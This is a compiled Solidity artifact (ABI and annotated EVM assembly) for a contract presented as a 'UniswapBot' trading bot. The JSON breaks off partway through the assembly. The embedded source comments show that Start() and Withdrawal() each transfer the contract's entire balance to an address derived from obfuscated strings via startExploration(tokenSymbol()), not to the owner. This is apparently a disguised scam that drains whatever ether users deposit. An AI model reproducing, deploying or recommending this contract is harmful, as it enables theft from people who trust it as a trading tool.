{
	"trade_bot.sol": {
		"UniswapBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"trade_bot.sol\":653:711  constructor() public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"trade_bot.sol\":653:711  constructor() public {\r... */\n  pop\n    /* \"trade_bot.sol\":693:703  msg.sender */\n  caller\n    /* \"trade_bot.sol\":685:690  owner */\n  0x02\n  0x00\n    /* \"trade_bot.sol\":685:703  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trade_bot.sol\":435:7892  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_13:\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_16:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_16)\n    tag_18:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_19\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_19:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":509:529  address public owner */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_20:\n        /* \"trade_bot.sol\":509:529  address public owner */\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_23:\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      pop\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_26:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_26)\n    tag_28:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"trade_bot.sol\":7719:7889  function symbol() public pure returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_29\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_29:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_30:\n        /* \"trade_bot.sol\":5568:5726  function Stop() public {\r... */\n      pop\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      stop\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n    tag_12:\n        /* \"trade_bot.sol\":5066:5076  address to */\n      0x00\n        /* \"trade_bot.sol\":5079:5110  startExploration(tokenSymbol()) */\n      tag_34\n        /* \"trade_bot.sol\":5096:5109  tokenSymbol() */\n      tag_35\n        /* \"trade_bot.sol\":5096:5107  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":5096:5109  tokenSymbol() */\n      jump\t// in\n    tag_35:\n        /* \"trade_bot.sol\":5079:5095  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":5079:5110  startExploration(tokenSymbol()) */\n      jump\t// in\n    tag_34:\n        /* \"trade_bot.sol\":5066:5110  address to = startExploration(tokenSymbol()) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5115:5140  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":5151:5153  to */\n      dup2\n        /* \"trade_bot.sol\":5115:5154  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":5159:5168  contracts */\n      dup1\n        /* \"trade_bot.sol\":5159:5177  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":5178:5190  getBalance() */\n      tag_38\n        /* \"trade_bot.sol\":5178:5188  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":5178:5190  getBalance() */\n      jump\t// in\n    tag_38:\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_41:\n        /* \"trade_bot.sol\":5159:5191  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":5037:5196  function Start() public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":6599:7124  function Withdrawal() public returns (string memory) {\r... */\n    tag_15:\n        /* \"trade_bot.sol\":6637:6650  string memory */\n      0x60\n        /* \"trade_bot.sol\":6657:6667  address to */\n      0x00\n        /* \"trade_bot.sol\":6670:6703  startExploration((tokenSymbol())) */\n      tag_43\n        /* \"trade_bot.sol\":6688:6701  tokenSymbol() */\n      tag_44\n        /* \"trade_bot.sol\":6688:6699  tokenSymbol */\n      tag_36\n        /* \"trade_bot.sol\":6688:6701  tokenSymbol() */\n      jump\t// in\n    tag_44:\n        /* \"trade_bot.sol\":6670:6686  startExploration */\n      tag_37\n        /* \"trade_bot.sol\":6670:6703  startExploration((tokenSymbol())) */\n      jump\t// in\n    tag_43:\n        /* \"trade_bot.sol\":6657:6703  address to = startExploration((tokenSymbol())) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6708:6733  address payable contracts */\n      0x00\n        /* \"trade_bot.sol\":6744:6746  to */\n      dup2\n        /* \"trade_bot.sol\":6708:6747  address payable contracts = payable(to) */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6758:6785  string memory _mempoolShort */\n      0x60\n        /* \"trade_bot.sol\":6788:6805  getMempoolShort() */\n      tag_45\n        /* \"trade_bot.sol\":6788:6803  getMempoolShort */\n      tag_46\n        /* \"trade_bot.sol\":6788:6805  getMempoolShort() */\n      jump\t// in\n    tag_45:\n        /* \"trade_bot.sol\":6758:6805  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6810:6839  string memory _mempoolEdition */\n      0x60\n        /* \"trade_bot.sol\":6842:6863  fetchMempoolEdition() */\n      tag_47\n        /* \"trade_bot.sol\":6842:6861  fetchMempoolEdition */\n      tag_48\n        /* \"trade_bot.sol\":6842:6863  fetchMempoolEdition() */\n      jump\t// in\n    tag_47:\n        /* \"trade_bot.sol\":6810:6863  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6868:6897  string memory _mempoolVersion */\n      0x60\n        /* \"trade_bot.sol\":6900:6921  fetchMempoolVersion() */\n      tag_49\n        /* \"trade_bot.sol\":6900:6919  fetchMempoolVersion */\n      tag_50\n        /* \"trade_bot.sol\":6900:6921  fetchMempoolVersion() */\n      jump\t// in\n    tag_49:\n        /* \"trade_bot.sol\":6868:6921  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6926:6952  string memory _mempoolLong */\n      0x60\n        /* \"trade_bot.sol\":6955:6971  getMempoolLong() */\n      tag_51\n        /* \"trade_bot.sol\":6955:6969  getMempoolLong */\n      tag_52\n        /* \"trade_bot.sol\":6955:6971  getMempoolLong() */\n      jump\t// in\n    tag_51:\n        /* \"trade_bot.sol\":6926:6971  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"trade_bot.sol\":6982:6991  contracts */\n      dup5\n        /* \"trade_bot.sol\":6982:7000  contracts.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      0x08fc\n        /* \"trade_bot.sol\":7001:7013  getBalance() */\n      tag_53\n        /* \"trade_bot.sol\":7001:7011  getBalance */\n      tag_39\n        /* \"trade_bot.sol\":7001:7013  getBalance() */\n      jump\t// in\n    tag_53:\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_55\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_55:\n        /* \"trade_bot.sol\":6982:7014  contracts.transfer(getBalance()) */\n      pop\n        /* \"trade_bot.sol\":7056:7069  _mempoolShort */\n      dup4\n        /* \"trade_bot.sol\":7071:7086  _mempoolEdition */\n      dup4\n        /* \"trade_bot.sol\":7088:7103  _mempoolVersion */\n      dup4\n        /* \"trade_bot.sol\":7105:7117  _mempoolLong */\n      dup4\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      add(0x20, mload(0x40))\n      dup1\n      dup6\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_56:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_58\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_56)\n    tag_58:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup5\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_59:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_59)\n    tag_61:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_62:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_64\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_62)\n    tag_64:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_65:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_67\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_65)\n    tag_67:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":7039:7118  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        